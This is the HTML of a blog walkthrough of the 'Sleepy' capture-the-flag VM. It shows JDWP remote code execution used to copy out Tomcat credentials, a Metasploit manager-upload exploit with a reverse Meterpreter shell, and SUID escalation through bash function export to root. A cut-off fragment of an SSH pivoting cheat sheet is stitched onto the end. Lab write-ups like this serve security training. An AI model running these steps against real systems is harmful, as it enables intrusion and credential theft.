</li> \n <li><a href=\"https://highon.coffee/blog/sleepy-ctf-walkthrough/#remote-exploitation\" id=\"markdown-toc-remote-exploitation\">Remote Exploitation</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/sleepy-ctf-walkthrough/#meterpreter-shell\" id=\"markdown-toc-meterpreter-shell\">Meterpreter Shell</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/sleepy-ctf-walkthrough/#local-privilege-escalation\" id=\"markdown-toc-local-privilege-escalation\">Local Privilege Escalation</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/sleepy-ctf-walkthrough/#enumeration\" id=\"markdown-toc-enumeration\">Enumeration</a></li> \n   <li><a href=\"https://highon.coffee/blog/sleepy-ctf-walkthrough/#binary-interrogation\" id=\"markdown-toc-binary-interrogation\">Binary Interrogation</a></li> \n   <li><a href=\"https://highon.coffee/blog/sleepy-ctf-walkthrough/#bash-function-manipulation\" id=\"markdown-toc-bash-function-manipulation\">Bash Function Manipulation</a></li> \n   <li><a href=\"https://highon.coffee/blog/sleepy-ctf-walkthrough/#root-flag\" id=\"markdown-toc-root-flag\">Root Flag</a></li> \n  </ul> </li> \n</ul> \n<h2 id=\"description\">Description</h2> \n<p><strong>Sleepy</strong> is part of the /dev/random: series created by Sagi-, it’s a little more difficult than <a href=\"https://highon.coffee/blog/pipe-ctf-walkthrough/\">Pipe</a> depending on your skill set.</p> \n<p><strong>Author:</strong> <a href=\"https://twitter.com/s4gi_\">@s4gi_ </a></p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com/entry/devrandom-sleepy,123/\">/dev/random: Sleepy</a> via <a href=\"https://twitter.com/VulnHub\">@VulnHub</a></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">_________.__                              \n/   _____/|  |   ____   ____ ______ ___.__.\n<span class=\"se\">\\_</span>____  <span class=\"se\">\\ </span>|  | _/ __ <span class=\"se\">\\_</span>/ __ <span class=\"se\">\\\\</span>____ &lt;   |  |\n/        <span class=\"se\">\\|</span>  |_<span class=\"se\">\\ </span> ___/<span class=\"se\">\\ </span> ___/|  |_&gt; <span class=\"o\">&gt;</span>___  |\n/_______  /|____/<span class=\"se\">\\_</span>__  <span class=\"o\">&gt;</span><span class=\"se\">\\_</span>__  <span class=\"o\">&gt;</span>   __// ____| ·VM·\n      <span class=\"se\">\\/</span>           <span class=\"se\">\\/</span>     <span class=\"se\">\\/</span>|__|   <span class=\"se\">\\/</span></code></pre> \n</figure> \n<p>##Enumeration</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 192.168.30.146\n\nPORT     STATE SERVICE REASON  VERSION\n21/tcp   open  ftp     syn-ack vsftpd 2.0.8 or later\n8009/tcp open  ajp13   syn-ack Apache Jserv <span class=\"o\">(</span>Protocol v1.3<span class=\"o\">)</span>\n9001/tcp open  jdwp    syn-ack Java Debug Wire Protocol <span class=\"o\">(</span>Reference Implementation<span class=\"o\">)</span> version 1.6 1.7.0_71\nMAC Address: 00:0C:29:8C:41:F7 <span class=\"o\">(</span>VMware<span class=\"o\">)</span>\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"nb\">type</span>: general purpose\nRunning: Linux 2.6.X|3.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3\nOS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13\nUptime guess: 49.709 days <span class=\"o\">(</span>since Wed Oct  7 20:28:44 2015<span class=\"o\">)</span></code></pre> \n</figure> \n<p>###Service Enumeration</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 21</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>FTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>vsftpd 2.0.8 or later</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 8009</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>ajp13</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache Jserv (Protocol v1.3)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 9001</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>jdwp</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Java Debug Wire Protocol version 1.6 1.7.0_71</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<p>###FTP Enumeration</p> \n<p>As nmap indicated, FTP had anonymous access enabled. Interrogation of the service revealed <code>/pub/sleepy.png </code></p> \n<p><img src=\"https://highon.coffee/img/blog/sleepy/sleepy.png\" alt=\"base64 image\" /></p> \n<h3 id=\"jserv-enumeration\">JServ Enumeration</h3> \n<p>JServ protocol is exposed with no web server proxy, JServ acts as a proxy and requires a web server to proxy it’s requests.</p> \n<h3 id=\"jdwp-enumeration\">JDWP Enumeration</h3> \n<p>Unauthenticated JDWP is exposed:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root]# jdb <span class=\"nt\">-attach</span> 192.168.30.146:9001</code></pre> \n</figure> \n<p>Research indicated it was possible to interrupt threads, with the command: <code>interupt</code> allowing for arbitrary code execution.</p> \n<div class=\"note tip\"> \n <h5>JDWP Commands</h5> \n <p>Type <code>help</code> for a list of <b>JDWP</b> commands.</p> \n</div> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root]# jdb <span class=\"nt\">-attach</span> 192.168.30.146:9001                                                                                                                                                 \nSet uncaught java.lang.Throwable\nSet deferred uncaught java.lang.Throwable\nInitializing jdb ...\n<span class=\"o\">&gt;</span> threads\nGroup system:\n  <span class=\"o\">(</span>java.lang.ref.Reference<span class=\"nv\">$ReferenceHandler</span><span class=\"o\">)</span>0x19d Reference Handler cond. waiting\n  <span class=\"o\">(</span>java.lang.ref.Finalizer<span class=\"nv\">$FinalizerThread</span><span class=\"o\">)</span>0x19e  Finalizer         cond. waiting\n  <span class=\"o\">(</span>java.lang.Thread<span class=\"o\">)</span>0x19f                         Signal Dispatcher running\nGroup main:\n  <span class=\"o\">(</span>java.lang.Thread<span class=\"o\">)</span>0x1a1                         main              sleeping\n<span class=\"o\">&gt;</span> interrupt 0x1a1\n<span class=\"o\">&gt;</span>\nException occurred: java.lang.InterruptedException <span class=\"o\">(</span>uncaught<span class=\"o\">)</span><span class=\"s2\">\"thread=main\"</span>, java.lang.Thread.sleep<span class=\"o\">()</span>, <span class=\"nv\">line</span><span class=\"o\">=</span><span class=\"nt\">-1</span> <span class=\"nv\">bci</span><span class=\"o\">=</span><span class=\"nt\">-1</span>\n\nmain[1] print new java.lang.String<span class=\"o\">(</span>new java.io.BufferedReader<span class=\"o\">(</span>new java.io.InputStreamReader<span class=\"o\">(</span>new java.lang.Runtime<span class=\"o\">()</span>.exec<span class=\"o\">(</span><span class=\"s2\">\"cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/\"</span><span class=\"o\">)</span>.getInputStream<span class=\"o\">()))</span>.readLine<span class=\"o\">())</span>\njava.lang.NullPointerException\n\tat com.sun.tools.example.debug.expr.LValue.argumentsMatch<span class=\"o\">(</span>LValue.java:268<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.LValue.resolveOverload<span class=\"o\">(</span>LValue.java:399<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.LValue.makeNewObject<span class=\"o\">(</span>LValue.java:820<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.AllocationExpression<span class=\"o\">(</span>ExpressionParser.java:1119<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.PrimaryPrefix<span class=\"o\">(</span>ExpressionParser.java:961<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.PrimaryExpression<span class=\"o\">(</span>ExpressionParser.java:909<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.PostfixExpression<span class=\"o\">(</span>ExpressionParser.java:834<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.UnaryExpressionNotPlusMinus<span class=\"o\">(</span>ExpressionParser.java:757<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.UnaryExpression<span class=\"o\">(</span>ExpressionParser.java:687<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.MultiplicativeExpression<span class=\"o\">(</span>ExpressionParser.java:611<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.AdditiveExpression<span class=\"o\">(</span>ExpressionParser.java:580<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.ShiftExpression<span class=\"o\">(</span>ExpressionParser.java:542<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.RelationalExpression<span class=\"o\">(</span>ExpressionParser.java:504<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.InstanceOfExpression<span class=\"o\">(</span>ExpressionParser.java:485<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.EqualityExpression<span class=\"o\">(</span>ExpressionParser.java:455<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.AndExpression<span class=\"o\">(</span>ExpressionParser.java:433<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.ExclusiveOrExpression<span class=\"o\">(</span>ExpressionParser.java:412<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.InclusiveOrExpression<span class=\"o\">(</span>ExpressionParser.java:391<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.ConditionalAndExpression<span class=\"o\">(</span>ExpressionParser.java:370<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.ConditionalOrExpression<span class=\"o\">(</span>ExpressionParser.java:349<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.ConditionalExpression<span class=\"o\">(</span>ExpressionParser.java:321<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.Expression<span class=\"o\">(</span>ExpressionParser.java:256<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.expr.ExpressionParser.evaluate<span class=\"o\">(</span>ExpressionParser.java:81<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.tty.Commands.evaluate<span class=\"o\">(</span>Commands.java:114<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.tty.Commands.doPrint<span class=\"o\">(</span>Commands.java:1654<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.tty.Commands<span class=\"nv\">$3</span>.action<span class=\"o\">(</span>Commands.java:1680<span class=\"o\">)</span>\n\tat com.sun.tools.example.debug.tty.Commands<span class=\"nv\">$AsyncExecution$1</span>.run<span class=\"o\">(</span>Commands.java:66<span class=\"o\">)</span>\n new java.lang.String<span class=\"o\">(</span>new java.io.BufferedReader<span class=\"o\">(</span>new java.io.InputStreamReader<span class=\"o\">(</span>new java.lang.Runtime<span class=\"o\">()</span>.exec<span class=\"o\">(</span><span class=\"s2\">\"cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/\"</span><span class=\"o\">)</span>.getInputStream<span class=\"o\">()))</span>.readLine<span class=\"o\">())</span> <span class=\"o\">=</span> null\nmain[1] <span class=\"nb\">exit</span></code></pre> \n</figure> \n<p>The Java code above copied the <code>/etc/tomcat/tomcat-users.xml</code> file to <code>/var/ftp/pub</code>. The default location for pub ftp on CentOS.</p> \n<p>tomcat-users.xml was download to the attacking machine and the following credentials were extracted:</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Username</th> \n    <th>Password</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>sl33py</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p><code>Gu3SSmYStR0NgPa$sw0rD!</code></p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<p>Full tomcat-users.xml file for completeness:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-xml\" data-lang=\"xml\"><span class=\"cp\">&lt;?xml version='1.0' encoding='utf-8'?&gt;</span>\n<span class=\"c\">&lt;!--\n  Licensed to the Apache Software Foundation (ASF) under one or more\n  contributor license agreements.  See the NOTICE file distributed with\n  this work for additional information regarding copyright ownership.\n  The ASF licenses this file to You under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with\n  the License.  You may obtain a copy of the License at\n\n      http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n  See the License for the specific language governing permissions and\n  limitations under the License.\n--&gt;</span>\n<span class=\"nt\">&lt;tomcat-users&gt;</span>\n<span class=\"c\">&lt;!--\n  NOTE:  By default, no user is included in the \"manager-gui\" role required\n  to operate the \"/manager/html\" web application.  If you wish to use this app,\n  you must define such a user - the username and password are arbitrary.\n--&gt;</span>\n<span class=\"c\">&lt;!--\n  NOTE:  The sample user and role entries below are wrapped in a comment\n  and thus are ignored when reading this file. Do not forget to remove\n  &lt;!.. ..&gt; that surrounds them.\n--&gt;</span>\n  <span class=\"nt\">&lt;role</span> <span class=\"na\">rolename=</span><span class=\"s\">\"tomcat\"</span><span class=\"nt\">/&gt;</span>\n  <span class=\"nt\">&lt;role</span> <span class=\"na\">rolename=</span><span class=\"s\">\"role1\"</span><span class=\"nt\">/&gt;</span>\n <span class=\"c\">&lt;!-- &lt;user username=\"tomcat\" password=\"tomcat\" roles=\"tomcat,manager-gui,admin,manager-jmx,admin-gui,admin-script,manager,manager-script,manager-status\"/&gt; --&gt;</span>\n  <span class=\"nt\">&lt;user</span> <span class=\"na\">username=</span><span class=\"s\">\"both\"</span> <span class=\"na\">password=</span><span class=\"s\">\"tomcat\"</span> <span class=\"na\">roles=</span><span class=\"s\">\"tomcat,role1\"</span><span class=\"nt\">/&gt;</span>\n  <span class=\"nt\">&lt;user</span> <span class=\"na\">username=</span><span class=\"s\">\"role1\"</span> <span class=\"na\">password=</span><span class=\"s\">\"tomcat\"</span> <span class=\"na\">roles=</span><span class=\"s\">\"role1\"</span><span class=\"nt\">/&gt;</span>\n\n<span class=\"nt\">&lt;role</span> <span class=\"na\">rolename=</span><span class=\"s\">\"admin\"</span><span class=\"nt\">/&gt;</span>\n <span class=\"nt\">&lt;role</span> <span class=\"na\">rolename=</span><span class=\"s\">\"admin-gui\"</span><span class=\"nt\">/&gt;</span>\n <span class=\"nt\">&lt;role</span> <span class=\"na\">rolename=</span><span class=\"s\">\"admin-script\"</span><span class=\"nt\">/&gt;</span>\n <span class=\"nt\">&lt;role</span> <span class=\"na\">rolename=</span><span class=\"s\">\"manager\"</span><span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;role</span> <span class=\"na\">rolename=</span><span class=\"s\">\"manager-gui\"</span><span class=\"nt\">/&gt;</span>\n <span class=\"nt\">&lt;role</span> <span class=\"na\">rolename=</span><span class=\"s\">\"manager-script\"</span><span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;role</span> <span class=\"na\">rolename=</span><span class=\"s\">\"manager-jmx\"</span><span class=\"nt\">/&gt;</span>\n <span class=\"nt\">&lt;role</span> <span class=\"na\">rolename=</span><span class=\"s\">\"manager-status\"</span><span class=\"nt\">/&gt;</span>\n<span class=\"c\">&lt;!-- &lt;user name=\"admin\" password=\"adminadmin\" roles=\"admin,manager,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status\" /&gt; --&gt;</span>\n\n\n<span class=\"nt\">&lt;user</span> <span class=\"na\">username=</span><span class=\"s\">\"sl33py\"</span> <span class=\"na\">password=</span><span class=\"s\">\"Gu3SSmYStR0NgPa$sw0rD!\"</span> <span class=\"na\">roles=</span><span class=\"s\">\"tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status\"</span><span class=\"nt\">/&gt;</span>\n\n<span class=\"nt\">&lt;/tomcat-users&gt;</span></code></pre> \n</figure> \n<h2 id=\"apache-tomcat-jserv-proxy-setup\">Apache Tomcat JServ Proxy setup</h2> \n<p>During enumeration JServ protocol was discovered exposed on the default port <code>TCP: 8009</code>. A local Apache proxy was setup on the attacking machine proxying requests back to the target JServ application server.</p> \n<h3 id=\"apache-tomcat-proxy-setup-script\">Apache Tomcat Proxy Setup Script</h3> \n<p>Script for automation of JServ Proxy on Attacking machine:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\">#!/bin/bash</span>\n    apt-get <span class=\"nb\">install </span>libapache2-mod-jk <span class=\"nt\">-y</span>\n    <span class=\"nb\">sed</span> <span class=\"nt\">-i</span> <span class=\"s1\">'s#JkWorkersFile /etc/libapache2-mod-jk/workers.properties#JkWorkersFile /etc/apache2/workers.properties#g'</span> /etc/apache2/mods-enabled/jk.conf\n    <span class=\"nb\">cp</span> /etc/libapache2-mod-jk/workers.properties /etc/apache2/\n    <span class=\"nb\">sed</span> <span class=\"nt\">-i</span> <span class=\"s1\">'s#worker.ajp13_worker.host=localhost#worker.ajp13_worker.host=192.168.30.146#g'</span> /etc/apache2/workers.properties\n    <span class=\"nb\">sed</span>  <span class=\"s1\">'/\\Host\\&gt;/i JKMount /* ajp13_worker'</span> /etc/apache2/sites-enabled/000-default.conf\n    a2enmod proxy_http proxy_ajp\n    service apache2 restart</code></pre> \n</figure> \n<p>Tomcat should be exposed when visiting <code>http://127.0.0.1</code> in <strong>Firefox</strong>.</p> \n<p><img src=\"https://highon.coffee/img/blog/sleepy/tomcat-jserv-apache-proxy.png\" alt=\"Tomcat JServ Apache Proxy\" /></p> \n<h2 id=\"remote-exploitation\">Remote Exploitation</h2> \n<p><strong>Tomcat</strong> is now exposed and login credentials have been obtained, it’s now possible to login via Tomcat Manager and leverage a shell via Metasploit.</p> \n<div class=\"note info\"> \n <h5>FingerprintCheck</h5> \n <p>The option: <code>set FingerprintCheck false</code> needs to be configured or meterpreter will throw the following error:</p> \n <p><code>[-] [2015.11.26-13:17:44] Exploit aborted due to failure: not-found: The target <br /> server fingerprint \"Apache/2.4.10 (Debian)\" does not match \"(?-mix:Apache.*(Coy<br />ote|Tomcat))\", use 'set FingerprintCheck false' to disable this check.</code></p> \n</div> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">msf exploit<span class=\"o\">(</span>tomcat_mgr_upload<span class=\"o\">)</span> <span class=\"o\">&gt;</span> show options\n\nModule options <span class=\"o\">(</span>exploit/multi/http/tomcat_mgr_upload<span class=\"o\">)</span>:\n\n   Name       Current Setting         Required  Description\n   <span class=\"nt\">----</span>       <span class=\"nt\">---------------</span>         <span class=\"nt\">--------</span>  <span class=\"nt\">-----------</span>\n   PASSWORD   Gu3SSmYStR0NgPa<span class=\"nv\">$sw0rD</span><span class=\"o\">!</span>  no        The password <span class=\"k\">for </span>the specified username\n   Proxies                            no        A proxy chain of format <span class=\"nb\">type</span>:host:port[,type:host:port][...]\n   RHOST      0.0.0.0                 <span class=\"nb\">yes       </span>The target address\n   RPORT      80                      <span class=\"nb\">yes       </span>The target port\n   TARGETURI  /manager                <span class=\"nb\">yes       </span>The URI path of the manager app <span class=\"o\">(</span>/html/upload and /undeploy will be used<span class=\"o\">)</span>\n   USERNAME   sl33py                  no        The username to authenticate as\n   VHOST                              no        HTTP server virtual host\n\n\nPayload options <span class=\"o\">(</span>java/meterpreter/reverse_tcp<span class=\"o\">)</span>:\n\n   Name   Current Setting  Required  Description\n   <span class=\"nt\">----</span>   <span class=\"nt\">---------------</span>  <span class=\"nt\">--------</span>  <span class=\"nt\">-----------</span>\n   LHOST  192.168.30.134   <span class=\"nb\">yes       </span>The listen address\n   LPORT  4444             <span class=\"nb\">yes       </span>The listen port\n\n\nExploit target:\n\n   Id  Name\n   <span class=\"nt\">--</span>  <span class=\"nt\">----</span>\n   0   Java Universal</code></pre> \n</figure> \n<h3 id=\"meterpreter-shell\">Meterpreter Shell</h3> \n<p>An unprivileged meterpreter shell was obtained:</p> \n<p><img src=\"https://highon.coffee/img/blog/sleepy/meterpreter.png\" alt=\"meterpreter shell\" /></p> \n<h2 id=\"local-privilege-escalation\">Local Privilege Escalation</h2> \n<h3 id=\"enumeration\">Enumeration</h3> \n<p>Searching for SUID files discovered a binary called <code>nightmare</code>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">bash-4.2<span class=\"nv\">$ </span>find / <span class=\"nt\">-user</span> root <span class=\"nt\">-perm</span> <span class=\"nt\">-4000</span> <span class=\"nt\">-print</span> 2&gt; /dev/null\nfind / <span class=\"nt\">-user</span> root <span class=\"nt\">-perm</span> <span class=\"nt\">-4000</span> <span class=\"nt\">-print</span> 2&gt; /dev/null\n/usr/bin/mount\n/usr/bin/chage\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/chsh\n/usr/bin/umount\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/crontab\n/usr/bin/nightmare\n/usr/bin/passwd\n/usr/sbin/pam_timestamp_check\n/usr/sbin/unix_chkpwd\n/usr/sbin/usernetctl\n/usr/lib/polkit-1/polkit-agent-helper-1\n/usr/lib64/dbus-1/dbus-daemon-launch-helper</code></pre> \n</figure> \n<h3 id=\"binary-interrogation\">Binary Interrogation</h3> \n<p>The <code>nightmare</code> binary was copied to the attacking machine and interrogated with strings.</p> \n<p><img src=\"https://highon.coffee/img/blog/sleepy/strings.png\" alt=\"nightmare binary strings\" /></p> \n<p>The binary <code>nightmare</code> appears to execute <code>/user/bin/sl</code> as the root user (SUID is on the execute bit).</p> \n<h3 id=\"bash-function-manipulation\">Bash Function Manipulation</h3> \n<p>Function manipulation was leveraged to execute <code>/bin/sh</code> by the nightmare binary, providing a root shell thus fully compromising the system.</p> \n<div class=\"note warning\"> \n <h5>Nightmare Process</h5> \n <p>After execution of <code>/usr/bin/nightmare</code> it was necessary to kill the <code>nightmare</code> process using <code>kill -2</code> via another shell in order for the root shell to spawn correctly. To search for the process use <code>ps aux | grep nightmare</code> and use <code>kill -2</code> command to kill the pid.</p> \n</div> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">meterpreter <span class=\"o\">&gt;</span> shell\nProcess 11 created.\nChannel 14 created.\n\n\npython <span class=\"nt\">-c</span> <span class=\"s1\">'import pty;pty.spawn(\"/bin/bash\")'</span>\nbash-4.2<span class=\"err\">$</span>\n\nbash-4.2<span class=\"err\">$</span>\n\nbash-4.2<span class=\"nv\">$ </span><span class=\"k\">function</span> /usr/bin/sl<span class=\"o\">()</span> <span class=\"o\">{</span> /bin/sh<span class=\"p\">;</span> <span class=\"o\">}</span>\n<span class=\"k\">function</span> /usr/bin/sl<span class=\"o\">()</span> <span class=\"o\">{</span> /bin/sh<span class=\"p\">;</span> <span class=\"o\">}</span>\nbash-4.2<span class=\"nv\">$ </span><span class=\"nb\">export</span> <span class=\"nt\">-f</span> /usr/bin/sl\n<span class=\"nb\">export</span> <span class=\"nt\">-f</span> /usr/bin/sl\nbash-4.2<span class=\"nv\">$ </span>/usr/bin/nightmare\n/usr/bin/nightmare\nError opening terminal: unknown.\n<span class=\"o\">[</span>+] Again <span class=\"o\">[</span>y/n]? sh-4.2# <span class=\"nb\">id\nid\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>,91<span class=\"o\">(</span>tomcat<span class=\"o\">)</span> <span class=\"nv\">context</span><span class=\"o\">=</span>system_u:system_r:tomcat_t:s0\nsh-4.2# <span class=\"nb\">cat</span> /root/flag.txt\n<span class=\"nb\">cat</span> /root/flag.txt\nWell <span class=\"k\">done</span><span class=\"o\">!</span>\n\nHere<span class=\"s1\">'s your flag: 3eb030c6ab099b0a355712fe38d59ffb</span></code></pre> \n</figure> \n<h3 id=\"root-flag\">Root Flag</h3> Subnet</a> \n    <ul> \n     <li><a href=\"https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-pivoting-using-proxychains\" id=\"markdown-toc-ssh-pivoting-using-proxychains\">SSH Pivoting using Proxychains</a></li> \n     <li><a href=\"https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-port-forwarding-command\" id=\"markdown-toc-ssh-port-forwarding-command\">SSH Port Forwarding Command</a></li> \n    </ul> </li> \n   <li><a href=\"https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-and-meterpreter-pivoting\" id=\"markdown-toc-ssh-and-meterpreter-pivoting\">SSH and Meterpreter Pivoting</a> \n    <ul> \n     <li><a href=\"https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#example-commands\" id=\"markdown-toc-example-commands\">Example commands</a></li> \n    </ul> </li> \n  </ul> </li> \n</ul> \n<h2 id=\"what-is-pivoting-\">What is Pivoting ?</h2> \n<p><strong>Pivoting</strong> is a technique used to route traffic through a compromised host on a penetration test.</p> \n<p>When conducting an external penetration test you may need to route traffic through a compromised machine in order to compromise internal targets.</p> \n<p><strong>Pivoting</strong>, allows you to leverage <a href=\"https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/\">pen test tools</a> on your attacking machine while routing traffic through other hosts on the subnet, and potentially allowing access to other subnets.</p> \n<h2 id=\"ssh-pivoting-cheatsheet\">SSH Pivoting Cheatsheet</h2> \n<h3 id=\"ssh-port-forwarding\">SSH Port Forwarding</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>ssh -L 9999:10.0.2.2:445 user@192.168.2.250</code></p> </td> \n    <td> <p>Port 9999 locally is forwarded to port 445 on 10.0.2.2 through host 192.168.2.250</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"ssh-port-forwarding-with-proxychains\">SSH Port Forwarding with Proxychains</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>ssh -D 127.0.0.1:9050 root@192.168.2.250</code></p> </td> \n    <td> <p>Dynamically allows all port forwards to the subnets availble on the target.</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<div class=\"note warning\"> \n <h5>Dynamic Proxychain Warning</h5> \n <p>Dynamic Proxychain SSH port forwarding does not work with nmap and metasploits meterpreter shells won't spawn.</p> \n</div> \n<p>If you attempt to spawn a shell via Meterpreter, you’ll get an error similar to the following:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">meterpreter <span class=\"o\">&gt;</span> execute <span class=\"nt\">-f</span> cmd.exe <span class=\"nt\">-i</span> <span class=\"nt\">-H</span>\n|S-chain|-&lt;<span class=\"o\">&gt;</span><span class=\"nt\">-127</span>.0.0.1:9050-&lt;<span class=\"o\">&gt;</span>&lt;<span class=\"o\">&gt;</span><span class=\"nt\">-127</span>.0.0.1:41713-&lt;<span class=\"nt\">--timeout</span></code></pre> \n</figure> \n<h3 id=\"using-proxychain-port-forwards\">Using Proxychain port forwards</h3> \n<p>When using a Proxychain port forward, all commands need to be prefixed with the proxychain command, this instructs the application traffic to route through the proxy.</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Connecting to RDP via Proxychains Dynamic Port Forwarding</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">proxychains rdesktop TARGET-IP</span> </p> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<h2 id=\"configure-metasploit-to-use-a-ssh-pivot\">Configure Metasploit to use a SSH Pivot</h2> \n<p>The following is an example of how to configure Metersploit to use a SSH portward. In this example port 9999 is forwarded to the target and the attacking machine has an IP address of 192.168.2.100:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">Setup the port forward <span class=\"o\">(</span>instructions above<span class=\"o\">)</span>, <span class=\"k\">then </span>configure msfconsole as follows <span class=\"o\">(</span>using MS08_067 <span class=\"k\">in </span>this example<span class=\"o\">)</span><span class=\"nb\">.</span>\n\n msf exploit<span class=\"o\">(</span>ms08_067_netapi<span class=\"o\">)</span> <span class=\"o\">&gt;</span> show options\n\n Module options <span class=\"o\">(</span>exploit/windows/smb/ms08_067_netapi<span class=\"o\">)</span>:\n\n    Name     Current Setting  Required  Description\n    <span class=\"nt\">----</span>     <span class=\"nt\">---------------</span>  <span 